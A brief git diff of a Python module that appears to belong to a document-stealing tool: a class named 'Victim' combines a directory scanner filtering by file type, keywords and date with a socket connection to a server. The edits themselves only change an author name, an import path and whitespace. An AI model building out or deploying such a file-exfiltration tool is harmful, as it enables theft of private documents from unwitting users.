@@ -1,9 +1,9 @@
-__author__ = 'ben'
+__author__ = 'iBen'
 
 import socket
 
 from DocPullerScripts.DocPullerFTP.protocol import Protocol
-from DocPullerScripts.DocPullerGenric import DocPuller
+from DirectoriesScaner.DocPullerGenric import DocPuller
 
 
 class Victim(DocPuller, Protocol):
@@ -12,7 +12,7 @@ class Victim(DocPuller, Protocol):
         DocPuller.__init__(self, directorys, file_types, key_words, date)
         Protocol.__init__(self, server, port)
         self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+    
     def _pull_files(self):
         while self._running or not self._pull_files_queue.empty():
             if not self._pull_files_queue.empty():
